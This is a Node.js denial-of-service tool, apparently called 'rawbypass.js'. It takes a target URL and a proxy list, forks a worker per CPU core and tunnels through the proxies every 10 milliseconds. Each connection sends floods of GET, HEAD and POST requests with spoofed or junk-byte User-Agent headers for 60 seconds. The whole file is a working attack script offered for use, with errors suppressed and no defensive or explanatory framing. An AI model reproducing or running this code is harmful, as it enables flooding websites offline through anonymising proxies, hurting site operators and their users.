const cluster = require('cluster');
const os = require('os');
const fs = require('fs');
const url = require('url');
const net = require('net');

if (process.argv.length <= 3) {
    console.log("node rawbypass.js target proxy.txt");
    process.exit(-1);
}

var target = process.argv[2];
var parsed = url.parse(target);
var host = url.parse(target).host;
var proxyFile = process.argv[3];

var proxies = [];
try {
    var data = fs.readFileSync(proxyFile, 'utf8');
    proxies = data.split('\n').filter(line => line.trim() !== '');
    console.log('🔥 Load ' + proxies.length + ' proxy');
} catch (e) {
    console.log('❌ Gagal load proxy.txt');
    process.exit(-1);
}

if (cluster.isMaster) {
    const numCPUs = os.cpus().length;
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }
    setTimeout(() => {
        process.exit(0);
    }, 60 * 1000);
} else {
    process.on('uncaughtException', function (e) { });
    process.on('unhandledRejection', function (e) { });

    const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0"
    ];

    const nullHexs = [
        "\x00", "\xFF", "\xC2", "\xA0", "\x01", "\x02", "\x03", "\x04",
        "\x05", "\x06", "\x07", "\x08", "\x0B", "\x0C", "\x0E", "\x0F",
        "\x10", "\x11", "\x12", "\x13", "\x14", "\x15", "\x16", "\x17",
        "\x18", "\x19", "\x1A", "\x1B", "\x1C", "\x1D", "\x1E", "\x1F"
    ];

    var proxyIndex = 0;

    function getProxy() {
        var proxy = proxies[proxyIndex % proxies.length];
        proxyIndex++;
        var parts = proxy.split(':');
        if (parts.length === 2) {
            return { ip: parts[0], port: parseInt(parts[1]) };
        } else if (parts.length === 4) {
            return { ip: parts[2], port: parseInt(parts[3]) };
        }
        return null;
    }

    var int = setInterval(() => {
        var s = require('net').Socket();
        var proxy = getProxy();
        if (!proxy) return;

        s.connect(proxy.port, proxy.ip);
        s.setTimeout(10000);

        var connectPayload = 'CONNECT ' + host + ':80 HTTP/1.1\r\nHost: ' + host + '\r\n\r\n';
        s.write(connectPayload);

        s.on('data', function (data) {
            if (data.toString().indexOf('Connection established') !== -1 || data.toString().indexOf('200') !== -1) {
                for (var i = 0; i < 50; i++) {
                    s.write(
                        'GET ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host +
                        '\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] +
                        '\r\n\r\n');

                    s.write(
                        'HEAD ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host +
                        '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' +
                        '\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] +
                        '\r\nUpgrade-Insecure-Requests: 1' +
                        '\r\nAccept-Encoding: gzip, deflate' +
                        '\r\nAccept-Language: en-US,en;q=0.9' +
                        '\r\nCache-Control: max-age=0' +
                        '\r\nConnection: Keep-Alive\r\n\r\n');

                    s.write(
                        'POST ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host +
                        '\r\nuser-agent: ' + nullHexs[Math.floor(Math.random() * nullHexs.length)] +
                        '\r\n\r\n');
                }
                setTimeout(function () {
                    s.destroy();
                }, 5000);
            } else {
                s.destroy();
            }
        });

        s.on('error', function () {
            s.destroy();
        });

        s.on('timeout', function () {
            s.destroy();
        });

    }, 10);
    setTimeout(() => clearInterval(int), 60 * 1000);
}